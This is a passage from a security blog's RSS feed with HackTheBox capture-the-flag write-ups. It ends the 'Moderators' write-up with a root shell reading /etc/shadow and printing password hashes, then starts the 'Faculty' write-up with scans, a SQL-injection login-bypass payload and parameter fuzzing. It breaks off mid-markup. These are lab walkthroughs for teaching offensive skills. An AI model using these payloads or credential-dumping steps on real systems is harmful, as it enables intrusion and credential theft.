font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /etc/shadow</span>
<span id="cb32-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb32-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fa3a5c96cf4976a1d91f804c6372e3db</span></span>
<span id="cb32-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$aqIOGu</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.rJRXjVGgt</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$lN7qDpHZdrBxEcRi4VxcJt4dpNXwmxLsO7mTliULzPVcJyy5OPxLP3SmvgcprzkeZLbX</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.lPrqEg3JYYyV3Ayo0:19021:0:99999:7:::</span></span>
<span id="cb32-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$PK0A253j816qSMhV$4</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Oy/1b8vR6K1XDcvBMzAVZn.MOVLiBWDHOugQorKdhVBnbi1o.fSKcSzrltl9z7hiGekw6bkt18XH14e0ALTC0:18890:0:99999:7:::</span></span>
<span id="cb32-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$IXHONvrvfEmCO7dH$banmCiCTcf7rcYWQr7jn3GkYeRpfQYWxafrlhhpcpdOfqkMwBEpFXVinENnfhEa3EdiE92v30PBhp6GqF6w67</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/:18890:0:99999:7:::</span></span></code></pre></div>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>file upload</category>
  <category>tunneling</category>
  <category>vboxdie-cracker</category>
  <category>luks</category>
  <category>bruteforce</category>
  <guid>https://exploit.se/posts/2022-09-05-htb-writeup-moderators/2022-09-05-htb-writeup-moderators.html</guid>
  <pubDate>Fri, 02 Sep 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Faculty - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-08-26-htb-writeup-faculty/2022-08-26-htb-writeup-faculty.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  faculty nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.169</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-5"></span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  faculty nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.10.11.169</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3072</span> e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http    nginx 1.18.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Did not follow redirect to http://faculty.htb</span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> nginx/1.18.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span></code></pre></div>
<p><strong>dirb:</strong></p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">==</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> DIRECTORY: http://faculty.htb/admin/</span></code></pre></div>
<ul>
<li>http://10.10.11.169 forwards to http://faculty.htb, add to <code>/etc/hosts</code></li>
</ul>
<p><img src="https://exploit.se/posts/2022-08-26-htb-writeup-faculty/images/faculty01.png" class="img-fluid"></p>
<p>Testing a Faculty ID we see in Burp that it’s vulnerable to SQL Injection. <img src="https://exploit.se/posts/2022-08-26-htb-writeup-faculty/images/faculty02.png" class="img-fluid"></p>
<p><img src="https://exploit.se/posts/2022-08-26-htb-writeup-faculty/images/faculty03.png" class="img-fluid"></p>
<p>Look for a authentication bypass variable.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Request:</span> id_no=1337<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span></span>
<span id="cb3-2"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Response: 3</span></span>
<span id="cb3-3"></span>
<span id="cb3-4"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Request: id_no=1337'</span>or 1=1#</span>
<span id="cb3-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Response:</span> 1</span></code></pre></div>
<p>Test <code>id_no=1337'or 1=1#</code> as Faculty ID on the webpage and we successfully bypass the login mechanism and are met with a scheduling system for user <code>Smith, John C</code>. <img src="https://exploit.se/posts/2022-08-26-htb-writeup-faculty/images/faculty04.png" class="img-fluid"></p>
<p>We can’t do anything, to my knowledge, on this scheduling system but if we visit <code>http://faculty.htb/admin</code> our PHPSESSID cookie is carried over and we login as use <code>Smith, John C</code>. Looking around the page we find <strong>Faculty List</strong> containing two other users; <code>Blake Claire G, cblake@faculty.htb</code> and <code>James, Eric P, ejames@faculty.htb</code> as well as John’s email address <code>jsmith@faculty.htb</code> with their corresponding ID No.</p>
<p><img src="https://exploit.se/posts/2022-08-26-htb-writeup-faculty/images/faculty05.png" class="img-fluid"></p>
<p>Fuzzing the URL parameter we find a new end point, <code>users</code>:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  byp4xx git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">✗</span> ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://faculty.htb/admin/index.php\?page\=FUZZ <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-b</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"PHPSESSID=6nhsugkb63bt2hf68uf76c846d"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-fw</span> 2641</span>
<span id="cb4-2"></span>
<span id="cb4-3">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'___\  /'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">___\</span>           /<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'___\       </span></span>
<span id="cb4-4"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span>
<span id="cb4-5"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span>
<span id="cb4-6"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span>
<span id="cb4-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span>
<span id="cb4-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">          \/_/    \/_/   \/___/    \/_/       </span></span>
<span id="cb4-9"></span>
<span id="cb4-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">       v1.5.0 Kali Exclusive &lt;3</span></span>
<span id="cb4-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">________________________________________________</span></span>
<span id="cb4-12"></span>
<span id="cb4-13"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: Method           : GET</span></span>
<span id="cb4-14"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: URL              : http://faculty.htb/admin/index.php?page=FUZZ</span></span>
<span id="cb4-15"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt</span></span>
<span id="cb4-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: Header           : Cookie: PHPSESSID=6nhsugkb63bt2hf68uf76c846d</span></span>
<span id="cb4-17"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: Follow redirects : false</span></span>
<span id="cb4-18"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: Calibration      : false</span></span>
<span id="cb4-19"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: Timeout          : 10</span></span>
<span id="cb4-20"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: Threads          : 40</span></span>
<span id="cb4-21"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span>
<span id="cb4-22"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> :: Filter           : Response words: 2641-2645</span></span>
<span id="cb4-23"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">________________________________________________</span></span>
<span id="cb4-24"></span>
<span id="cb4-25"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">courses                 [Status: 200, Size: 20137, Words: 2007, Lines: 534, Duration: 35ms]</span></span>
<span id="cb4-26"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">faculty                 [Status: 200, Size: 19455, Words: 1953, Lines: 534, Duration: 35ms]</span></span>
<span id="cb4-27"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">schedule                [Status: 200, Size: 16477, Words: 2273, Lines: 517, Duration: 53ms]</span></span>
<span id="cb4-28"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">subjects                [Status: 200, Size: 21202, Words: 2008, Lines: 548, Duration: 69ms]</span></span>
<span id="cb4-29"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">users                   [Status: 200, Size: 12514, Words: 1685, Lines: 386, Duration: 97ms]</span></span></code></pre></div>
<p><img src="https://exploit.se/posts/2022-08-26-htb-writeup-faculty/images/faculty06.png" class="img-fluid"></p>
<p>Here we find user <code>admin</code>. We are unable to edit the user, nor can we create a new user by pressing the blue button (nothing happens). Looking in the source code it seems to be connected to <code>manage_users.php</code> but all actions are cropped.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode html code-with-copy"><code class="sourceCode html"><span id="cb5-1"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">script</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb5-2">    <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">$</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'table'</span>)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">dataTable</span>()<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb5-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">$</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'#new_user'</span>)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">click</span>(<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">function</span>(){</span>
<span id="cb5-4">    <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">uni_modal</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'New User'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'manage_user.php'</span>)</span>
<span id="cb5-5">})</span>
<span id="cb5-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">$</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'.edit_user'</span>)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">click</span>(<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">function</span>(){</span>
<span id="cb5-7">    <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">uni_modal</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Edit User'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'manage_user.php?id='</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">$</span>(<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">this</span>)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">attr</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'data-id'</span>))</span>
<span id="cb5-8">})</span></code></pre></div>
<p>Changing tracks - we are able to export “Course List”, “Subject List” and “Faculty List” as PDF. Testing to generate one we find that it’s a simple POST request to <code>/admin/download.php</code> with a huge base64 blob as payload.</p>
<p>Analyzing the payload it’s base64 encoded &gt; url encoded &gt; url encoded:</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode html code-with-copy"><code class="sourceCode html"><span id="cb6-1"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">h1</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">a</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"top"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">a</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>faculty.htb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">h1</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">h2</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>Subjects<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">h2</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">table</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>  <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">thead</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>     <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>            <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">th</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>#<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">th</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>          <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">th</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-left"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>Subject<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">th</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>          <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">th</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-left"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>Description<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">th</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>          <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">thead</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tbody</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>1<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>DBMS<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>Database Management System<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>2<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
